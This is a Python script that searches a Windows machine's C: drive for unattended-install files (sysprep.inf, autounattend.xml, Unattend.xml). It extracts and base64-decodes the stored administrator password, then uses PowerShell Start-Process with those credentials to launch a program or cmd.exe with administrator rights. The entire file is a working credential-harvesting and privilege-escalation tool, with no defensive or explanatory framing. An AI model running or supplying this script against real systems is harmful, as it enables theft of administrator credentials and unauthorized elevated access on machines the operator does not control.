#!/usr/bin/python3

import os
import re  # Import the regular expressions module
import base64 # To decode the extracted password
import subprocess as sp # To help running commands

def extract_password(file_path):
    """
    Opens a file, searches for the AdministratorPassword Value tag using regex,
    and returns the matched value if found.
    """
    pattern = r'<AdministratorPassword>\s*<Value>(.*?)</Value>'

    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
            match = re.search(pattern, content, re.DOTALL)
            if match:
                return match.group(1).strip()
    except Exception as e:
        print(f" [!] Could not read {file_path}: {e}")

    return None

def find_files(targets, base_dir="C:\\"):
    targets_found = list()
    print(f'Starting search for {targets} in {base_dir}...\n')
    
    for root, dirs, files in os.walk(base_dir):
        for file in files:
            # Case-insensitive comparison for targets
            if file.lower() in [t.lower() for t in targets]:
                path = os.path.join(root, file)
                print(f'[+] Found file: {file} in {path}')
                targets_found.append(file)
                
                extracted_val = extract_password(path)
                if extracted_val:
                    print(f'[*] Extracted Value: {extracted_val}')
                    
                    clean_val = extracted_val.strip()
                    missing_padding = len(clean_val) % 4
                    if missing_padding:
                        clean_val += '=' * (4 - missing_padding)
                    
                    try:
                        # Attempt Base64 decoding
                        ascii_string = base64.b64decode(clean_val).decode('utf-8')
                        print(f'[+] Decoded Password: {ascii_string}')
                    except Exception as decode_error:
                        # Fallback if the data is already plain text
                        ascii_string = clean_val
                        print(f'[*] Using password as plain text (Decode failed: {decode_error})')
                    
                    # Target configuration and process setup
                    admin_user = "SuperAdministrator"
                    admin_pass = ascii_string
                    
                    program_name = "NeedsAdminPrivilege.exe" 
                    program = os.path.abspath(program_name)
                    
                    if not os.path.exists(program):
                        print(f"[!] Warning: {program} not found in current directory.")
                        program = "C:\\Windows\\System32\\cmd.exe"
                        print(f"[*] Falling back to: {program}")

                    # Format the PowerShell automation block securely
                    ps_script = f"""
                    $secPass = ConvertTo-SecureString '{admin_pass}' -AsPlainText -Force
                    $cred = New-Object System.Management.Automation.PSCredential('{admin_user}', $secPass)
                    Start-Process '{program}' -Credential $cred
                    """

                    try:
                        powershell_path = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
                        sp.run([powershell_path, "-Command", ps_script], check=True)
                        print("[+] Process start command dispatched.")
                    except Exception as e:
                        print(f"[!] Execution failed: {e}")
                        
                else:
                    print(f'[-] No matching password tags found in this file.')

    print("\n[!] File search is complete")

    # Tracking missing entries
    missed_targets = set([t.lower() for t in targets]) - set([t.lower() for t in targets_found])
    if missed_targets:
        print(f' [-] Target(s) not found: {list(missed_targets)}')

if __name__ == '__main__':
    target_files = ["sysprep.inf", "autounattend.xml", "Unattend.xml"]
    find_files(targets=target_files, base_dir="C:\\")
    
    input("\nPress Enter to exit...")
